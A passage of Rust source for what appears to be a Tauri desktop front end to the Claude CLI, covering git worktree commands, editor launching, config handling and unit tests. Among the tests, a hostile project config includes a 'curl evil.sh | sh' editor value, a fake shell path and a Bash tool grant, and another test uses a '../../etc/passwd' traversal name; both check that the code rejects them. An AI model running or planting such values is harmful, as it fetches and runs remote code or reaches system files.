    if git(&main, &["rev-parse", "-q", "--verify", "MERGE_HEAD"]).is_ok() {
        return Err(format!("a merge is already in progress in {main}"));
    }
    match git(&main, &["merge", "--no-edit", "--", &branch]) {
        Ok(out) => Ok(out),
        Err(e) => {
            let _ = git(&main, &["merge", "--abort"]); // only ours to abort: there was no MERGE_HEAD before
            Err(e)
        }
    }
}

/// Remove a worktree (never the main one, never --force: a dirty tree must fail loudly) and optionally its branch.
#[tauri::command]
fn git_worktree_remove(cwd: String, path: String, delete_branch: bool) -> Result<(), String> {
    let list = worktrees(&cwd)?;
    let main = list.first().ok_or("no worktrees")?;
    if same_path(&main.path, &path) { return Err("refusing to remove the main worktree".into()) }
    let main = main.path.clone();
    let branch = list.iter().find(|w| same_path(&w.path, &path)).map(|w| w.branch.clone()).unwrap_or_default();
    // decided before we touch anything: a branch name we would not pass to git is no reason to leave the
    // worktree in place, so we remove it and simply keep the branch
    let delete = delete_branch && !branch.is_empty() && valid_name(&branch, true);
    git(&main, &["worktree", "remove", "--", &path])?;
    if delete {
        git(&main, &["branch", "-d", "--", &branch])?;
    }
    Ok(())
}

/// Open `path` (optionally at `line`) with the `editor` template from config; default `code -g {path}:{line}`.
#[tauri::command]
fn open_in_editor(path: String, line: Option<u32>) -> Result<(), String> {
    let tpl = config()["editor"].as_str().unwrap_or("code -g {path}:{line}").to_string();
    let q = |s: &str| format!("'{}'", s.replace('\'', "'\\''"));
    // the template's program must exist; otherwise fall back to the desktop default (xdg-open), else say so
    let prog = tpl.split_whitespace().next().unwrap_or("");
    let cmd = if on_path(prog) { tpl.replace("{path}", &q(&path)).replace("{line}", &line.unwrap_or(1).to_string()) }
        else if on_path("xdg-open") { format!("xdg-open {}", q(&path)) }
        else { return Err(format!("editor `{prog}` not found and no xdg-open; set `editor` in config.json")) };
    Command::new("sh").args(["-c", &cmd]).stdin(Stdio::null()).stdout(Stdio::null()).stderr(Stdio::null()).spawn().map(|_| ()).map_err(|e| e.to_string())
}

fn on_path(prog: &str) -> bool {
    if prog.is_empty() { return false }
    if prog.contains('/') { return std::path::Path::new(prog).is_file() }
    std::env::var_os("PATH").map(|p| std::env::split_paths(&p).any(|d| d.join(prog).is_file())).unwrap_or(false)
}

/// Titlebar ⚙ / Ctrl+, / `/config`: make sure the file exists (with a starter holding the main defaults) and open it.
#[tauri::command]
fn open_config() -> Result<String, String> {
    let path = std::path::PathBuf::from(config_file());
    if !path.is_file() {
        if let Some(d) = path.parent() { std::fs::create_dir_all(d).map_err(|e| e.to_string())?; }
        let starter = serde_json::json!({
            "theme": "dark", "model": "claude-opus-5[1m]", "effort": "high", "permissionMode": "acceptEdits",
            "fontFamily": "ui-monospace, monospace", "fontSize": 13, "sendKey": "enter", "notify": "all",
            "editor": "code -g {path}:{line}", "runCommand": "", "keys": {}, "claudeArgs": []
        });
        std::fs::write(&path, serde_json::to_string_pretty(&starter).unwrap() + "\n").map_err(|e| e.to_string())?;
    }
    let p = path.to_string_lossy().into_owned();
    open_in_editor(p.clone(), None)?;
    Ok(p)
}

#[derive(Serialize)]
struct TranscriptMsg {
    role: String,
    text: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    id: Option<String>, // tool_use id (role "tool") / tool_use_id (role "tool_result")
    #[serde(skip_serializing_if = "Option::is_none")]
    input: Option<serde_json::Value>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<bool>,
}
fn tm(role: &str, text: String) -> TranscriptMsg {
    TranscriptMsg { role: role.into(), text, id: None, input: None, error: None }
}

/// User/assistant text of a stored session, for showing history when resuming.
#[tauri::command]
fn load_transcript(cwd: String, id: String) -> Vec<TranscriptMsg> {
    let path = project_dir(&cwd).join(format!("{id}.jsonl"));
    let Ok(text) = std::fs::read_to_string(path) else { return vec![] };
    let mut out = vec![];
    for v in text.lines().filter_map(|l| serde_json::from_str::<serde_json::Value>(l).ok()) {
        let role = v["type"].as_str().unwrap_or("");
        if role != "user" && role != "assistant" || v["isMeta"].as_bool() == Some(true) {
            continue;
        }
        let content = &v["message"]["content"];
        if let Some(t) = content.as_str() {
            if !t.starts_with('<') { // skip <command-name>/<local-command-caveat> bookkeeping records
                out.push(tm(role, t.into()));
            }
            continue;
        }
        for b in content.as_array().into_iter().flatten() {
            match b["type"].as_str() {
                Some("text") => out.push(tm(role, b["text"].as_str().unwrap_or("").into())),
                Some("tool_use") => out.push(TranscriptMsg {
                    role: "tool".into(),
                    text: b["name"].as_str().unwrap_or("").into(),
                    id: b["id"].as_str().map(String::from),
                    input: Some(b["input"].clone()),
                    error: None,
                }),
                Some("tool_result") => {
                    let c = &b["content"];
                    let text = c.as_str().map(String::from).unwrap_or_else(|| {
                        c.as_array().into_iter().flatten().filter_map(|x| x["text"].as_str()).collect::<Vec<_>>().join("\n")
                    });
                    out.push(TranscriptMsg { role: "tool_result".into(), text, id: b["tool_use_id"].as_str().map(String::from), input: None, error: b["is_error"].as_bool() });
                }
                _ => {}
            }
        }
    }
    out
}

/// Slash commands from user-level and project-level skills/commands dirs (CLI only reports its list after the first turn).
#[tauri::command]
fn list_skills(cwd: String) -> Vec<String> {
    let mut out = vec![];
    for base in [home(), cwd] {
        if let Ok(rd) = std::fs::read_dir(format!("{base}/.claude/skills")) {
            out.extend(rd.filter_map(|e| e.ok()).filter(|e| e.path().join("SKILL.md").exists()).map(|e| e.file_name().to_string_lossy().into_owned()));
        }
        if let Ok(rd) = std::fs::read_dir(format!("{base}/.claude/commands")) {
            out.extend(rd.filter_map(|e| e.ok()).filter_map(|e| e.path().file_stem().map(|s| s.to_string_lossy().into_owned())));
        }
    }
    out
}

/// Write one raw JSON line to the session's stdin (control requests/responses built by the frontend).
#[tauri::command]
fn write_line(state: State<Sessions>, id: String, line: String) -> Result<(), String> {
    let stdin = session_stdin(&state, &id)?;
    write_json_line(&stdin, &line)
}

/// Relative paths under `cwd` containing `query` (case-insensitive), depth <= 5, skipping build/vcs dirs. For `@file` completion.
#[tauri::command]
async fn list_files(cwd: String, query: String) -> Vec<String> {
    fn walk(dir: &std::path::Path, root: &std::path::Path, q: &str, depth: u8, out: &mut Vec<String>) {
        if depth > 5 || out.len() >= 40 { return; }
        let Ok(rd) = std::fs::read_dir(dir) else { return };
        for e in rd.filter_map(|e| e.ok()) {
            let name = e.file_name().to_string_lossy().into_owned();
            if matches!(name.as_str(), ".git" | "node_modules" | "target" | "dist" | ".venv" | "__pycache__") { continue; }
            let path = e.path();
            let rel = path.strip_prefix(root).unwrap_or(&path).to_string_lossy().into_owned();
            if rel.to_lowercase().contains(q) { out.push(rel); }
            if path.is_dir() { walk(&path, root, q, depth + 1, out); }
        }
    }
    let mut out = vec![];
    let root = std::path::PathBuf::from(&cwd);
    walk(&root, &root, &query.to_lowercase(), 0, &mut out);
    out.sort_by_key(|p| p.len());
    out.truncate(30);
    out
}

#[tauri::command]
fn stop_session(state: State<Sessions>, id: String) {
    // take the entry out under the lock, reap outside it: a stuck child must not freeze every other pane's writes
    let removed = lock(&state.0).remove(&id);
    if let Some(mut s) = removed {
        let _ = s.child.kill();
        std::thread::spawn(move || { let _ = s.child.wait(); });
    }
}

static MCP_PENDING: mcp::Pending = mcp::Pending::new();

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    if std::env::args().nth(1).as_deref() == Some("--mcp") {
        return mcp::bridge();
    }
    // NVIDIA + Wayland: WebKitGTK's DMA-BUF renderer shows a blank/garbled window; must be set before the webview starts
    if std::env::var_os("WEBKIT_DISABLE_DMABUF_RENDERER").is_none() {
        std::env::set_var("WEBKIT_DISABLE_DMABUF_RENDERER", "1");
    }
    tauri::Builder::default()
        .manage(&MCP_PENDING)
        .setup(|app| {
            mcp::listen(app.handle().clone(), &MCP_PENDING);
            watch_config(app.handle().clone());
            Ok(())
        })
        // closing the window must not leave orphaned `claude` processes and shells behind
        .on_window_event(|w, e| {
            if matches!(e, tauri::WindowEvent::Destroyed) {
                shutdown(w);
            }
        })
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_notification::init())
        .manage(Sessions::default())
        .manage(Ptys::default())
        .invoke_handler(tauri::generate_handler![start_session, send_message, stop_session, write_line, run_statusline, save_export, pty_open, pty_write, pty_resize, pty_cwd, pty_close, initial_cwd, list_sessions, load_transcript, list_skills, list_files, load_config, config_path, open_config, save_config_patch, cli_args, read_image, search_sessions, list_all_sessions, git_status, git_diff, git_worktree, git_worktree_list, git_worktree_merge, git_worktree_remove, open_in_editor, mcp::mcp_reply, log])
        .build(tauri::generate_context!())
        .expect("error while running tauri application")
        // app.exit() and signal-driven shutdowns never destroy a window, so they need the same cleanup
        .run(|app, ev| {
            if matches!(ev, tauri::RunEvent::Exit) {
                shutdown(app);
            }
        });
}

/// Kill every child we spawned and drop our MCP socket. Runs on the main thread at teardown, so it never waits
/// on a process indefinitely: SIGKILL, then poll for up to `REAP_DEADLINE` in total and move on.
fn shutdown<R: tauri::Runtime, M: tauri::Manager<R>>(m: &M) {
    const REAP_DEADLINE: std::time::Duration = std::time::Duration::from_secs(2);
    let (sessions_state, ptys_state) = (m.state::<Sessions>(), m.state::<Ptys>());
    let mut sessions = lock(&sessions_state.0);
    let mut ptys = lock(&ptys_state.0);
    for s in sessions.values_mut() {
        let _ = s.child.kill();
    }
    for p in ptys.values_mut() {
        let _ = p.child.kill();
    }
    let deadline = std::time::Instant::now() + REAP_DEADLINE;
    let mut left = true;
    while left && std::time::Instant::now() < deadline {
        left = sessions.values_mut().any(|s| !matches!(s.child.try_wait(), Ok(Some(_)) | Err(_)))
            || ptys.values_mut().any(|p| !matches!(p.child.try_wait(), Ok(Some(_)) | Err(_)));
        if left {
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
    }
    sessions.clear();
    ptys.clear();
    mcp::cleanup_sock();
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Needs a real ~/.claude/projects entry; run with X_TERM_TEST_CWD=<project dir that has skills and sessions>.
    #[test]
    fn utf8_flush_keeps_partial_tail() {
        let s = "가나".as_bytes(); // 3 bytes each
        assert_eq!(utf8_flush_len(&s[..4]), 3); // "가" + first byte of "나" -> hold the tail
        assert_eq!(utf8_flush_len(s), 6);
        assert_eq!(utf8_flush_len(&[0x61, 0xff, 0x62]), 3); // invalid byte -> flush all (lossy)
    }

    #[test]
    fn base64_matches_rfc() {
        assert_eq!(base64(b""), "");
        assert_eq!(base64(b"f"), "Zg==");
        assert_eq!(base64(b"fo"), "Zm8=");
        assert_eq!(base64(b"foobar"), "Zm9vYmFy");
    }

    #[test]
    fn git_status_on_this_repo() {
        let st = git_status(env!("CARGO_MANIFEST_DIR").into()).unwrap();
        assert!(st.root.ends_with("x-term"), "{}", st.root);
        assert!(git_diff(st.root.clone(), Some("README.md".into())).is_ok());
        assert!(git_worktree(st.root, "bad name".into()).is_err());
    }

    #[test]
    fn project_config_overrides_global_per_key() {
        let global = serde_json::json!({
            "model": "claude-opus-5[1m]",
            "editor": "code -g {path}:{line}",
            "agentModels": {"light": {"model": "haiku"}, "heavy": {"model": "opus"}},
        });
        let project = serde_json::json!({
            "model": "claude-sonnet-5",
            "effort": "low",
            "agentModels": {"heavy": {"model": "opus-1m"}},
        });
        let m = merge_config(global.clone(), project);
        assert_eq!(m["model"], "claude-sonnet-5", "whitelisted project key wins");
        assert_eq!(m["editor"], "code -g {path}:{line}", "untouched global key survives");
        assert_eq!(m["effort"], "low", "whitelisted project-only key is added");
        assert_eq!(m["agentModels"]["heavy"]["model"], "opus-1m", "weight overridden");
        assert_eq!(m["agentModels"]["light"]["model"], "haiku", "other weights kept");
        // an empty / non-object project file changes nothing
        assert_eq!(merge_config(global.clone(), serde_json::json!({})), global);
        assert_eq!(merge_config(global.clone(), serde_json::Value::Null), global);
    }

    /// A cloned repo's .x-term.json must never decide what x-term executes or where it writes.
    #[test]
    fn project_config_cannot_set_execution_keys() {
        let global = serde_json::json!({"editor": "code -g {path}:{line}", "shell": "/bin/bash"});
        let hostile = serde_json::json!({
            "shell": "/tmp/evil.sh",
            "claudeArgs": ["--allowedTools", "Bash"],
            "worktreeDir": "/tmp/{name}",
            "exportDir": "/tmp/loot",
            "editor": "curl evil.sh | sh",
            "keys": {"quit": "x"},
            "theme": "light",
            "fontFamily": "x",
            "model": "claude-haiku-4-5",
        });
        let m = merge_config(global.clone(), hostile);
        for k in ["shell", "claudeArgs", "worktreeDir", "exportDir", "editor", "keys", "theme", "fontFamily"] {
            assert_eq!(m[k], global[k], "project file must not reach `{k}`");
        }
        assert_eq!(m["model"], "claude-haiku-4-5", "but the model is still project-settable");
        assert!(PROJECT_KEYS.iter().all(|k| !["shell", "claudeArgs", "worktreeDir", "exportDir", "editor"].contains(k)));
        // a non-object global still filters the project file
        let m = merge_config(serde_json::Value::Null, serde_json::json!({"shell": "/tmp/evil.sh", "effort": "high"}));
        assert!(m["shell"].is_null() && m["effort"] == "high");
    }

    #[test]
    fn config_for_reads_the_repo_root() {
        // this repo has no .x-term.json, so the merge is a no-op; non-repo paths must not panic either
        assert_eq!(config_for(env!("CARGO_MANIFEST_DIR")), config());
        assert!(config_for("/nonexistent-dir-x-term").is_object());
    }

    #[test]
    fn worktree_template_substitutes() {
        assert_eq!(worktree_path("{repo}-wt/{name}", "/src/app", "fix"), "/src/app-wt/fix");
        assert_eq!(worktree_path("~/wt/{name}", "/src/app", "fix"), format!("{}/wt/fix", home()));
        assert_eq!(worktree_path("/tmp/{name}-of-{repo}", "/src/app", "fix"), "/tmp/fix-of-/src/app");
        // ~ only expands on its own or before a slash; another user's home is not ours to resolve
        assert_eq!(expand_tilde("~"), std::path::PathBuf::from(home()));
        assert_eq!(expand_tilde("~/a/b"), std::path::PathBuf::from(format!("{}/a/b", home())));
        assert_eq!(expand_tilde("~root/x"), std::path::PathBuf::from("~root/x"));
        assert_eq!(expand_tilde("/abs/x"), std::path::PathBuf::from("/abs/x"));
        assert!(!valid_name("bad name", false) && !valid_name("-x", false) && !valid_name("a..b", true));
        assert!(valid_name("feat_1-x", false) && valid_name("feat/x.2", true) && !valid_name("feat/x", false));
    }

    #[test]
    fn worktree_list_has_a_main_entry() {
        let ws = git_worktree_list(env!("CARGO_MANIFEST_DIR").into()).unwrap();
        assert!(!ws.is_empty());
        assert!(ws[0].main && ws.iter().skip(1).all(|w| !w.main), "exactly the first non-bare entry is main");
        assert!(ws[0].path.ends_with("x-term"), "{}", ws[0].path);
        assert!(ws.iter().all(|w| w.head.len() == 7), "short shas");
        assert!(git_worktree_remove(env!("CARGO_MANIFEST_DIR").into(), ws[0].path.clone(), false).is_err(), "main worktree is protected");
        assert!(git_worktree_merge(env!("CARGO_MANIFEST_DIR").into(), "-x".into()).is_err(), "branch names are validated");
        assert!(save_export("../../etc/passwd".into(), String::new()).is_err(), "export name is a filename, not a path");
        assert!(save_export("a/b".into(), String::new()).is_err());
    }

    /// A scratch repo with one commit on `main`, for the worktree commands.
    fn scratch_repo(tag: &str) -> String {
        let dir = std::env::temp_dir().join(format!("x-term-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let _ = std::fs::remove_dir_all(format!("{}-wt", dir.display()));
        std::fs::create_dir_all(&dir).unwrap();
        let d = dir.to_string_lossy().into_owned();
        git(&d, &["init", "-q", "-b", "main", "."]).unwrap();
        git(&d, &["config", "user.email", "t@t"]).unwrap();
        git(&d, &["config", "user.name", "t"]).unwrap();
        std::fs::write(dir.join("f.txt"), "base\n").unwrap();
        git(&d, &["add", "-A"]).unwrap();
        git(&d, &["commit", "-qm", "init"]).unwrap();
        d
    }

    #[test]
    fn worktree_add_remove_round_trip() {
        let repo = scratch_repo("wt");
        let path = git_worktree(repo.clone(), "feat".into()).unwrap();
        assert!(std::path::Path::new(&path).is_dir());
        assert!(worktrees(&repo).unwrap().iter().any(|w| same_path(&w.path, &path) && w.branch == "feat"));
        assert_eq!(git_worktree(repo.clone(), "feat".into()).unwrap(), path, "second call is idempotent");
        // a dirty worktree must fail loudly rather than be force-removed
        std::fs::write(std::path::Path::new(&path).join("dirty.txt"), "x").unwrap();
        assert!(git_worktree_remove(repo.clone(), path.clone(), true).is_err(), "dirty tree is not removed");
        std::fs::remove_file(std::path::Path::new(&path).join("dirty.txt")).unwrap();
        git_worktree_remove(repo.clone(), path.clone(), true).unwrap();
        assert!(!std::path::Path::new(&path).exists());
        assert!(git(&repo, &["rev-parse", "--verify", "--quiet", "refs/heads/feat"]).is_err(), "branch deleted too");
        // a plain directory where the worktree would go is not ours to hand out
        std::fs::create_dir_all(&path).unwrap();
        assert!(git_worktree(repo.clone(), "feat".into()).unwrap_err().contains("not a worktree"));
        let _ = std::fs::remove_dir_all(&repo);
        let _ = std::fs::remove_dir_all(format!("{repo}-wt"));
    }

    #[test]
    fn merge_refuses_to_touch_a_merge_already_in_progress() {
        let repo = scratch_repo("merge");
        git(&repo, &["checkout", "-qb", "feat"]).unwrap();
        std::fs::write(format!("{repo}/f.txt"), "feat\n").unwrap();
        git(&repo, &["commit", "-qam", "feat"]).unwrap();
        git(&repo, &["checkout", "-q", "main"]).unwrap();
        std::fs::write(format!("{repo}/f.txt"), "main\n").unwrap();
        git(&repo, &["commit", "-qam", "main"]).unwrap();
        // our own failed merge is rolled back, leaving no MERGE_HEAD behind
        assert!(git_worktree_merge(repo.clone(), "feat".into()).is_err(), "conflicting merge fails");
        assert!(git(&repo, &["rev-parse", "-q", "--verify", "MERGE_HEAD"]).is_err(), "aborted our own merge");
        // a merge someone else started is left exactly as it is
        assert!(git(&repo, &["merge", "--no-edit", "--", "feat"]).is_err());
        let err = git_worktree_merge(repo.clone(), "feat".into()).unwrap_err();
        assert!(err.contains("already in progress"), "{err}");
        assert!(git(&repo, &["rev-parse", "-q", "--verify", "MERGE_HEAD"]).is_ok(), "their merge survived");
        let _ = std::fs::remove_dir_all(&repo);
    }

    /// `git worktree list --porcelain` for a bare repo leads with a `bare` entry that has no working tree.
    #[test]
    fn porcelain_parser_skips_bare_entries() {
        let ws = parse_worktrees("worktree /repo.git\nbare\n\nworktree /wt/a\nHEAD 1234567890abcdef\nbranch refs/heads/a\n\nworktree /wt/b\nHEAD abcdef1234567890\ndetached\n");
        assert_eq!(ws.len(), 2, "the bare repo itself is not a checkout");
        assert!(ws[0].main && ws[0].path == "/wt/a" && ws[0].branch == "a" && ws[0].head == "1234567");
        assert!(!ws[1].main && ws[1].branch.is_empty(), "detached head has no branch");
        // no bare entry: the first worktree is main, as before
        let ws = parse_worktrees("worktree /main\nHEAD 1111111111\nbranch refs/heads/main\n\nworktree /wt/x\nHEAD 2222222222\nbranch refs/heads/x\n");
        assert!(ws.len() == 2 && ws[0].main && !ws[1].main);
        assert!(parse_worktrees("").is_empty());
    }

    #[test]
    fn head_tail_keeps_whole_lines() {
        let path = std::env::temp_dir().join(format!("x-term-ht-{}.jsonl", std::process::id()));
        let big: String = (0..5000).map(|i| format!("{{\"n\":{i},\"pad\":\"{}\"}}\n", "x".repeat(40))).collect();
        std::fs::write(&path, &big).unwrap();
        let (h, t) = head_tail(&path, 1024).unwrap();
        assert!(h.starts_with("{\"n\":0,") && h.ends_with('}') && h.lines().count() > 10, "head is whole lines");
        assert!(t.starts_with('{') && t.trim_end().ends_with("}") && t.contains("\"n\":4999,"), "tail is whole lines to EOF");
        std::fs::write(&path, "{\"a\":1}\n").unwrap();
        let (h, t) = head_tail(&path, 1024).unwrap();
        assert_eq!(h, t);
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn sessions_and_skills_from_claude_dir() {
        let Ok(cwd) = std::env::var("X_TERM_TEST_CWD") else { return };
        assert!(!list_skills(cwd.clone()).is_empty());
        let ss = list_sessions(cwd.clone());
        assert!(!ss.is_empty());
        assert!(ss.windows(2).all(|w| w[0].mtime >= w[1].mtime), "newest first");
        let tr = load_transcript(cwd, ss[0].id.clone());
        assert!(tr.iter().any(|m| m.role == "user"), "transcript has user text");
        assert!(tr.iter().all(|m| !m.text.is_empty() || m.role == "tool" || m.role == "tool_result"));
        assert!(tr.iter().any(|m| m.role == "tool" && m.input.is_some()), "tool cards carry their input");
    }
}
